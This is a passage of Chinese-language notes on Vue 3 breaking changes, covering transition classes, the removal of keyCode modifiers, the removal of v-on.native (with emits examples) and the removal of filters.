	opacity: 0;
}
.v-leave-from,
.v-enter-to {
	opacity: 1;
}
```

**3、移除keyCode作为v-on的修饰符，同时也不再支持`config.keyCodes`**

**4、移除`v-on.native`修饰符**

​	父组件中绑定事件：

```vue
<my-component/
 v-on:close="handleComponentEvent"
 v-on:click="handleNativeClickEvent"
>
```

​	子组件中声明自定义事件：

```vue
<script>
 export default {
 	emits: ['close']
 }
</script>
```

**5、移除过滤器**

过滤器虽然看起来很方便，但它需要一个自定义语法，打破大括号内表达式是“只是JavaScript”的假设，这不仅有学习成本，而且有实现成本！建议用方法调用